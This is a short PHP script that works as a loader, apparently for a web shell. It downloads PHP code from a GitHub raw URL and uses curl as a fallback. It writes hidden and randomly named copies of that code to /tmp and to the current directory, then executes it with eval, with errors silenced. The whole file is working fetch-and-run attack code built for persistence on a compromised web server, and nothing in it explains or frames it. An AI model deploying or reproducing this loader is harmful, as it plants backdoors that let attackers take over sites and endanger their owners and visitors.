<?php
$hidden_name = '/tmp/.' . bin2hex(random_bytes(8)) . '.php';
$normal_name = '/tmp/' . bin2hex(random_bytes(10)) . '.php';

$url = "https://github.com/Jenderal92/php/raw/refs/heads/master/13k.php";


$data = @file_get_contents($url);
if ($data === false) {
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $data = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);
    if ($data === false) {

        die('Failed to retrieve content from URL: ' . $error);
    }
}

if ($data !== false && $data !== '') {
    @file_put_contents($hidden_name, $data);
    @file_put_contents($normal_name, $data);
    
    $current_random = bin2hex(random_bytes(8)) . '.php';
    @file_put_contents($current_random, $data);
    
    eval("?" . ">" . $data);
}
?>
